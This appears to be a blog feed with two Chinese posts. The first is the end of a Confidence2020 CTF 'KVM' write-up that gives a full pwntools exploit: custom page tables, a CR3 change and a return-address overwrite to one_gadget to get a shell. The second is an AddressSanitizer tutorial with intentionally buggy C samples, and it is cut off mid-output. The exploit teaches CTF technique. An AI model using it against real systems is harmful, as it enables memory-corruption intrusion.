aligned_guest_mem;</span><br></pre></td></tr></table></figure><p>从上面的代码可以看出程序预计给虚拟机分配0x8000大小的空间，然后进行了个对齐操作使得分配的真实地址为aligned_guest_mem，然后后面实际再给虚拟机分配的时候还是分配了0x8000大小的空间，这样就会导致虚拟机越界读到了主机的内存。</p><p>首先我们看到我们memset的地址如下</p><p><img src="/" alt="image-20200925224629609.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/vHc9aoD4Smt6XAw.png"></p><p>对齐后的地址如下。</p><p><img src="/" alt="image-20200925224707504.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/zHNjYs5uEqfrtDx.png"></p><p>通过动态调试我们发现返回地址所在地址<code>(0x7FFFFFFFDE68)</code>包含在<code>aligned_guest_mem(0x7FFFFFFF6000)</code>到<code>aligned_guest_mem+0x8000(0x7FFFFFFFE000)</code>内，注意此处的aligned_guest_mem是通过分配host的栈空间作为VM的进程空间。对于host来说地址是<code>aligned_guest_mem</code>到<code>aligned_guest_mem+0x8000</code>，而对于虚拟机来说地址是<code>0</code>到<code>0x8000</code>。</p><p><img src="/" alt="image-20200925225217368.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/EPRjwCrOscaJSbm.png"></p><p>用下图来更清晰的表示。</p><p><img src="/" alt="image-20200925224348738.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/9UJeq7CaGh4d3ID.png"></p><p>然后程序有两个输入点，第一个输入的值会作为第二个输入点的可输入长度然后第二个输入点，输入的内容可以作为shellcode执行。</p><p>下面就是利用这个地方，在动调的过程中可以发现最后main返回的地址是存储在over这个区域的，所以就需要对存储返回地址的地方进行写操作，写成onegadget的地址就可以拿到shell了，写操作需要注意的就是[0x1000]这样读0x1000地址存储的内容不一定会读到0x1000，因为有分页机制所以虚拟地址需要转换成物理地址才可以使用，还需要注意一点的是64位环境下使用的是4级页表是48位，然后分为9、9、9、12四段，如下图所示。</p><p><img src="/" alt="image-20200925230016886.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/N2RVtIPu9kFXejn.png"></p><p>根据这四段来获取到物理地址所以我们的shellcode就需要确保经过转换后的地址对应着的是返回地址。</p><p>具体的做法就是<strong>更改cr3的值</strong>，<strong>自己构造4级页表</strong>，<strong>促使[0x1000]这样访问到的内存就是0x7000地址处的内存</strong>，这里访问到0x7000是因为0x7000到0x8000包含了越界的部分，所以我们只需要循环遍历0x7000到0x8000以便找到ebp，从而控制执行流，其中页表的访问方式就应该是这样的，用我手画的图表示如下（以访问0x1000为例）：</p><p><img src="/" alt="image-20200925230906050.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/ZGhBCqprunD48x5.png"></p><p>后面的0x1003、0x2003、0x3003等在ida中可看到。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v20 = <span class="number">0x7000</span>LL;</span><br><span class="line">v21 = <span class="number">0x6000</span>LL;</span><br><span class="line">v22 = <span class="number">0x5000</span>LL;</span><br><span class="line">v23 = <span class="number">0x4000</span>LL;</span><br><span class="line">*(aligned_guest_mem + <span class="number">0xE00</span>) = <span class="number">3L</span>L;</span><br><span class="line">*&amp;aligned_guest_mem[v20 + <span class="number">8</span>] = <span class="number">0x1003</span>LL;</span><br><span class="line">*&amp;aligned_guest_mem[v20 + <span class="number">16</span>] = <span class="number">0x2003</span>LL;</span><br><span class="line">*&amp;aligned_guest_mem[v20 + <span class="number">24</span>] = <span class="number">0x3003</span>LL;</span><br></pre></td></tr></table></figure><p>所以我们的shellcode就需要确保经过转换后的地址对应着的是返回地址，然后把返回地址改成oengadget就可以拿到shell了。</p><p>exp最开始设置访问的地址是0x1020，然后一直循环访问到对应地址存储的内容不是0的地方，经过动调发现在retun的返回地址前只有3个地址是有内容的，再往前看都是0，所以循环结束后访问的地址就是return的返回地址-3，所以要修改retuen的地址就需要+3，然后把这个地址里面的内容修改成one_gadget就可以拿到shell了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">p = process(<span class="string">"./kvm"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./kvm"</span>)</span><br><span class="line">payload = asm(</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    mov qword ptr [0x1000], 0x2003</span></span><br><span class="line"><span class="string">    mov qword ptr [0x2000], 0x3003</span></span><br><span class="line"><span class="string">    mov qword ptr [0x3000], 0x0003</span></span><br><span class="line"><span class="string">    mov qword ptr [0x0], 0x3</span></span><br><span class="line"><span class="string">    mov qword ptr [0x8], 0x7003</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x1000</span></span><br><span class="line"><span class="string">    mov cr3, rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rcx, 0x1020</span></span><br><span class="line"><span class="string">#############search ret#############</span></span><br><span class="line"><span class="string">look_for_ra:   </span></span><br><span class="line"><span class="string">    add rcx, 8</span></span><br><span class="line"><span class="string">    cmp qword ptr [rcx], 0</span></span><br><span class="line"><span class="string">    je look_for_ra</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    add rcx, 24</span></span><br><span class="line"><span class="string">#############overwrite ret#############</span></span><br><span class="line"><span class="string">overwrite_ra:  </span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rcx]</span></span><br><span class="line"><span class="string">    add rax, 0x249e6</span></span><br><span class="line"><span class="string">    mov qword ptr [rcx], rax</span></span><br><span class="line"><span class="string">    hlt</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">)</span><br><span class="line">log.success(<span class="string">'len = '</span>+str(len(payload)))</span><br><span class="line">p.send(<span class="string">"\x68\x00\x00\x00"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recv(<span class="number">16</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>对于exp几个疑惑的点：</p><ul><li><p>0x1020 ：这里我本来写的是0x1000，但是没打通，在0x7000开始处我们写了四个字段，所以我们应该先跳过这四个字段开始，经过动态调试发现返回地址只有前面三个字段有内容，其他都是0，所以一次遍历到不为0为止，然后我们add 24，跳过这三个字段就能到达ret处。</p><p><img src="/" alt="image-20200925232304528.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/tph8ysFVoinqW1f.png"></p></li><li><p>0x249e6 : 这里是返回地址到one_gadget地址的偏移，动态调试后发现execve_addr-ret_addr=0x249e6。</p></li></ul><p>成功利用截图：</p><p><img src="/" alt="image-20200925232856994.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/T2rDMolGOvBZkJI.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Confidence2020-CTF-KVM&quot;&gt;&lt;a href=&quot;#Confidence2020-CTF-KVM&quot; class=&quot;headerlink&quot; title=&quot;Confidence2020 CTF KVM&quot;&gt;&lt;/a&gt;Confidence2020 CTF K
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>【ASAN】简单使用指南</title>
    <link href="https://billyotry.github.io/2020/09/14/%E3%80%90ASAN%E3%80%91%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <id>https://billyotry.github.io/2020/09/14/%E3%80%90ASAN%E3%80%91%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</id>
    <published>2020-09-14T06:34:37.134Z</published>
    <updated>2020-09-14T07:57:02.937Z</updated>
    
    <content type="html"><![CDATA[<p>以下内容仅为归纳，具体细节可自行测试。</p><h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><ul><li>用<code>-fsanitize=address</code>选项编译和链接你的程序。</li><li>用<code>-fno-omit-frame-pointer</code>编译，以得到更容易理解stack trace。</li><li>可选择<code>-O1</code>或者更高的优化级别编译</li></ul><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">gcc -fsanitize=address -fno-omit-frame-pointer -O1 -g use-after-<span class="built_in">free</span>.c -o use-after-<span class="built_in">free</span></span><br></pre></td></tr></table></figure><p>如果发现错误，就会打印如下日志信息，如<code>UAF</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">4897</span>==ERROR: AddressSanitizer: heap-use-after-free <span class="keyword">on</span> address <span class="number">0x60200000eff0</span> at pc <span class="number">0x0000004009b6</span> bp <span class="number">0x7fff58399250</span> sp <span class="number">0x7fff58399240</span></span><br><span class="line">READ of size <span class="number">4</span> at <span class="number">0x60200000eff0</span> thread T0</span><br><span class="line">    <span class="meta">#0 0x4009b5 in main /home/c7/桌面/asan/use_after_free.c:14</span></span><br><span class="line">    <span class="meta">#1 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x400868 in _start (/home/c7/桌面/asan/use_after_free+0x400868)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x60200000eff0</span> <span class="keyword">is</span> located <span class="number">0</span> bytes inside of <span class="number">4</span>-<span class="keyword">byte</span> region [<span class="number">0x60200000eff0</span>,<span class="number">0x60200000eff4</span>)</span><br><span class="line">freed <span class="keyword">by</span> thread T0 here:</span><br><span class="line">    <span class="meta">#0 0x7fd6cfd9d2ca in __interceptor_free (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x982ca)</span></span><br><span class="line">    <span class="meta">#1 0x40097e in main /home/c7/桌面/asan/use_after_free.c:13</span></span><br><span class="line">    <span class="meta">#2 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">previously allocated <span class="keyword">by</span> thread T0 here:</span><br><span class="line">    <span class="meta">#0 0x7fd6cfd9d602 in malloc (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x98602)</span></span><br><span class="line">    <span class="meta">#1 0x40094e in main /home/c7/桌面/asan/use_after_free.c:6</span></span><br><span class="line">    <span class="meta">#2 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-use-after-free /home/c7/桌面/asan/use_after_free.c:<span class="number">14</span> main</span><br></pre></td></tr></table></figure><ul><li>第一部分（ERROR）指出错误类型是heap-use-after-free；</li><li>第二部分（READ）, 指出线程名thread T0，操作为READ，发生的位置是use-after-free.c:14。</li><li>第三部分 (SUMMARY) 前面输出的概要说明。</li></ul><h2 id="编译选项"><a href="#编译选项" class="headerlink" title="编译选项"></a>编译选项</h2><h3 id="fsanitize-address"><a href="#fsanitize-address" class="headerlink" title="-fsanitize=address"></a>-fsanitize=address</h3><p>用户态内存错误检测，可以被环境变量ASAN_OPTIONS控制具体行为。</p><p><strong>use after free</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> * value = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="literal">NULL</span> == value)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"malloc failed\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(value);</span><br><span class="line">  <span class="keyword">return</span> *value;  <span class="comment">// use after free. BOOM!!!!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译链接</p><p><code>gcc -g -o use_after_free -fsanitize=address -lasan -fuse-ld=gold use_after_free.c</code></p><p><code>LD_PRELOAD=${LD_PRELOAD}:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so  ./use_after_free</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">4897</span>==ERROR: AddressSanitizer: heap-use-after-free <span class="keyword">on</span> address <span class="number">0x60200000eff0</span> at pc <span class="number">0x0000004009b6</span> bp <span class="number">0x7fff58399250</span> sp <span class="number">0x7fff58399240</span></span><br><span class="line">READ of size <span class="number">4</span> at <span class="number">0x60200000eff0</span> thread T0      <span class="comment">//访问释放后的内存</span></span><br><span class="line">    <span class="meta">#0 0x4009b5 in main /home/c7/桌面/asan/use_after_free.c:14</span></span><br><span class="line">    <span class="meta">#1 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x400868 in _start (/home/c7/桌面/asan/use_after_free+0x400868)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x60200000eff0</span> <span class="keyword">is</span> located <span class="number">0</span> bytes inside of <span class="number">4</span>-<span class="keyword">byte</span> region [<span class="number">0x60200000eff0</span>,<span class="number">0x60200000eff4</span>)</span><br><span class="line">freed <span class="keyword">by</span> thread T0 here:        <span class="comment">//内存在哪里释放</span></span><br><span class="line">    <span class="meta">#0 0x7fd6cfd9d2ca in __interceptor_free (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x982ca)</span></span><br><span class="line">    <span class="meta">#1 0x40097e in main /home/c7/桌面/asan/use_after_free.c:13</span></span><br><span class="line">    <span class="meta">#2 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">previously allocated <span class="keyword">by</span> thread T0 here:         <span class="comment">//内存在哪里申请</span></span><br><span class="line">    <span class="meta">#0 0x7fd6cfd9d602 in malloc (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x98602)</span></span><br><span class="line">    <span class="meta">#1 0x40094e in main /home/c7/桌面/asan/use_after_free.c:6</span></span><br><span class="line">    <span class="meta">#2 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-use-after-free /home/c7/桌面/asan/use_after_free.c:<span class="number">14</span> main</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c047fff9da0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9db0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9dc0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9dd0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9de0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">=&gt;<span class="number">0x0c047fff9df0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fd]fa</span><br><span class="line">  <span class="number">0x0c047fff9e00</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e10</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e20</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e30</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e40</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line"><span class="function">Shadow <span class="keyword">byte</span> <span class="title">legend</span> (<span class="params">one shadow <span class="keyword">byte</span> represents <span class="number">8</span> application bytes</span>):</span></span><br><span class="line"><span class="function">  Addressable:           00</span></span><br><span class="line"><span class="function">  Partially addressable: 01 02 03 04 05 06 07 </span></span><br><span class="line"><span class="function">  Heap left redzone:       fa</span></span><br><span class="line"><span class="function">  Heap right redzone:      fb</span></span><br><span class="line"><span class="function">  Freed heap region:       fd</span></span><br><span class="line"><span class="function">  Stack left redzone:      f1</span></span><br><span class="line"><span class="function">  Stack mid redzone:       f2</span></span><br><span class="line"><span class="function">  Stack right redzone:     f3</span></span><br><span class="line"><span class="function">  Stack <span class="keyword">partial</span> redzone:   f4</span></span><br><span class="line"><span class="function">  Stack after return:      f5</span></span><br><span class="line"><span class="function">  Stack use after scope:   f8</span></span><br><span class="line"><span class="function">  Global redzone:          f9</span></span><br><span class="line"><span class="function">  Global init order:       f6</span></span><br><span class="line"><span class="function">  Poisoned <span class="keyword">by</span> user:        f7</span></span><br><span class="line"><span class="function">  Container overflow:      fc</span></span><br><span class="line"><span class="function">  Array cookie:            ac</span></span><br><span class="line"><span class="function">  Intra <span class="keyword">object</span> redzone:    bb</span></span><br><span class="line"><span class="function">  ASan <span class="keyword">internal</span>:           fe</span></span><br><span class="line"><span class="function"></span>==<span class="number">4897</span>==ABORTING</span><br></pre></td></tr></table></figure><p><strong>heap-buffer-overflow</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> * value = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="literal">NULL</span> == value)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"malloc failed\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> a= <span class="number">100</span>;</span><br><span class="line">  *((<span class="keyword">int</span>*)value) = a;  <span class="comment">// heap buffer overflow.  BOOM</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> *value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o heap_buffer_overflow -fsanitize=address -lasan -fuse-ld=gold heap_buffer_overflow.c</code></p><p><code>LD_PRELOAD=${LD_PRELOAD}:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so  ./heap_buffer_overflow</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">4969</span>==ERROR: AddressSanitizer: heap-buffer-overflow <span class="keyword">on</span> address <span class="number">0x60200000eff0</span> at pc <span class="number">0x000000400971</span> bp <span class="number">0x7ffc34e7a150</span> sp <span class="number">0x7ffc34e7a140</span></span><br><span class="line">WRITE of size <span class="number">4</span> at <span class="number">0x60200000eff0</span> thread T0      <span class="comment">//这里内存越界</span></span><br><span class="line">    <span class="meta">#0 0x400970 in main /home/c7/桌面/asan/heap_buffer_overflow.c:13</span></span><br><span class="line">    <span class="meta">#1 0x7f817497183f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x400828 in _start (/home/c7/桌面/asan/heap_buffer_overflow+0x400828)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x60200000eff1</span> <span class="keyword">is</span> located <span class="number">0</span> bytes to the right of <span class="number">1</span>-<span class="keyword">byte</span> region [<span class="number">0x60200000eff0</span>,<span class="number">0x60200000eff1</span>)</span><br><span class="line">allocated <span class="keyword">by</span> thread T0 here:</span><br><span class="line">    <span class="meta">#0 0x7f8174db3602 in malloc (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x98602)</span></span><br><span class="line">    <span class="meta">#1 0x40090e in main /home/c7/桌面/asan/heap_buffer_overflow.c:6</span></span><br><span class="line">    <span class="meta">#2 0x7f817497183f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /home/c7/桌面/asan/heap_buffer_overflow.c:<span class="number">13</span> main</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c047fff9da0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9db0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9dc0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9dd0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9de0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">=&gt;<span class="number">0x0c047fff9df0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa[<span class="number">01</span>]fa</span><br><span class="line">  <span class="number">0x0c047fff9e00</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e10</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e20</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e30</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c047fff9e40</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line"><span class="function">Shadow <span class="keyword">byte</span> <span class="title">legend</span> (<span class="params">one shadow <span class="keyword">byte</span> represents <span class="number">8</span> application bytes</span>):</span></span><br><span class="line"><span class="function">  Addressable:           00</span></span><br><span class="line"><span class="function">  Partially addressable: 01 02 03 04 05 06 07 </span></span><br><span class="line"><span class="function">  Heap left redzone:       fa</span></span><br><span class="line"><span class="function">  Heap right redzone:      fb</span></span><br><span class="line"><span class="function">  Freed heap region:       fd</span></span><br><span class="line"><span class="function">  Stack left redzone:      f1</span></span><br><span class="line"><span class="function">  Stack mid redzone:       f2</span></span><br><span class="line"><span class="function">  Stack right redzone:     f3</span></span><br><span class="line"><span class="function">  Stack <span class="keyword">partial</span> redzone:   f4</span></span><br><span class="line"><span class="function">  Stack after return:      f5</span></span><br><span class="line"><span class="function">  Stack use after scope:   f8</span></span><br><span class="line"><span class="function">  Global redzone:          f9</span></span><br><span class="line"><span class="function">  Global init order:       f6</span></span><br><span class="line"><span class="function">  Poisoned <span class="keyword">by</span> user:        f7</span></span><br><span class="line"><span class="function">  Container overflow:      fc</span></span><br><span class="line"><span class="function">  Array cookie:            ac</span></span><br><span class="line"><span class="function">  Intra <span class="keyword">object</span> redzone:    bb</span></span><br><span class="line"><span class="function">  ASan <span class="keyword">internal</span>:           fe</span></span><br><span class="line"><span class="function"></span>==<span class="number">4969</span>==ABORTING</span><br></pre></td></tr></table></figure><p><strong>memory leak</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  p = <span class="built_in">malloc</span>(<span class="number">7</span>);</span><br><span class="line">  p = <span class="number">0</span>; <span class="comment">// The memory is leaked here.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o memory_leak -fsanitize=address -lasan -fuse-ld=gold memory_leak.c</code></p><p><code>LD_PRELOAD=${LD_PRELOAD}:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so   ./memory_leak</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">5014</span>==ERROR: LeakSanitizer: detected memory leaks</span><br><span class="line"></span><br><span class="line">Direct leak of <span class="number">7</span> <span class="keyword">byte</span>(s) <span class="keyword">in</span> <span class="number">1</span> <span class="keyword">object</span>(s) allocated <span class="keyword">from</span>:</span><br><span class="line">    <span class="meta">#0 0x7f3e3f381602 in malloc (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x98602)</span></span><br><span class="line">    <span class="meta">#1 0x400703 in main /home/c7/桌面/asan/memory_leak.c:6</span></span><br><span class="line">    <span class="meta">#2 0x7f3e3ef3f83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: <span class="number">7</span> <span class="keyword">byte</span>(s) leaked <span class="keyword">in</span> <span class="number">1</span> allocation(s).</span><br></pre></td></tr></table></figure><h3 id="Stack-buffer-overflow"><a href="#Stack-buffer-overflow" class="headerlink" title="Stack-buffer-overflow"></a>Stack-buffer-overflow</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> stack_array[<span class="number">100</span>];</span><br><span class="line">  stack_array[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> stack_array[argc + <span class="number">100</span>];  <span class="comment">// BOOM</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o memory_leak -fsanitize=address -lasan -fuse-ld=gold memory_leak.c</code></p><p><code>LD_PRELOAD=${LD_PRELOAD}:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so   ./stack_overflow</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">5077</span>==ERROR: AddressSanitizer: stack-buffer-overflow <span class="keyword">on</span> address <span class="number">0x7ffe67846ad4</span> at pc <span class="number">0x000000400916</span> bp <span class="number">0x7ffe67846900</span> sp <span class="number">0x7ffe678468f0</span></span><br><span class="line">READ of size <span class="number">4</span> at <span class="number">0x7ffe67846ad4</span> thread T0</span><br><span class="line">    <span class="meta">#0 0x400915 in main /home/c7/桌面/asan/stack_overflow.c:4</span></span><br><span class="line">    <span class="meta">#1 0x7fd65942183f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x400758 in _start (/home/c7/桌面/asan/stack_overflow+0x400758)</span></span><br><span class="line"></span><br><span class="line">Address <span class="number">0x7ffe67846ad4</span> <span class="keyword">is</span> located <span class="keyword">in</span> stack of thread T0 at offset <span class="number">436</span> <span class="keyword">in</span> frame</span><br><span class="line">    <span class="meta">#0 0x400835 in main /home/c7/桌面/asan/stack_overflow.c:1</span></span><br><span class="line"></span><br><span class="line">  This frame has <span class="number">1</span> <span class="keyword">object</span>(s):</span><br><span class="line">    [<span class="meta">32, 432) 'stack_array' &lt;== Memory access at offset 436 overflows this variable</span></span><br><span class="line"><span class="meta">HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext</span></span><br><span class="line"><span class="meta">      (longjmp and C++ exceptions *are* supported)</span></span><br><span class="line"><span class="meta">SUMMARY: AddressSanitizer: stack-buffer-overflow /home/c7/桌面/asan/stack_overflow.c:4 main</span></span><br><span class="line"><span class="meta">Shadow bytes around the buggy address:</span></span><br><span class="line"><span class="meta">  0x10004cf00d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">  0x10004cf00d10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">  0x10004cf00d20: 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">  0x10004cf00d30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">  0x10004cf00d40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">=&gt;0x10004cf00d50: 00 00 00 00 00 00 00 00 00 00[f4</span>]f4 f3 f3 f3 f3</span><br><span class="line">  <span class="number">0x10004cf00d60</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10004cf00d70</span>: <span class="number">00</span> <span class="number">00</span> <span 